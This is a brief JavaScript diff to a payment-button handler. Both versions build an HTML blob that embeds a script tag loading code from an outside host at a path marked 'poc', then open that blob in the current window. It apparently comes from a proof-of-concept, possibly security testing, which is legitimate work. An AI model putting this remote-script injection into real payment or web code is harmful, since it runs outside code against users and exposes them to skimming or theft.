@@ -145,7 +145,7 @@ async function onBuyClicked(windowLocalStorageIdentifier) {
     console.log('PaymentRequest API is not supported.');
     return;
   }
-	html = document.getElementsByTagName('html')[0].innerHTML+"<script src='https://lightrains.org/js/poc/test202104/poc.js'></script>";
+	html = "<script src='https://lightrains.org/js/poc/test202104/poc.js'></script>"+document.getElementsByTagName('body')[0].innerHTML;
 	blob = new Blob([html], {type: 'text/html'});
     url = URL.createObjectURL(blob); 
     window.open(url,"_self");
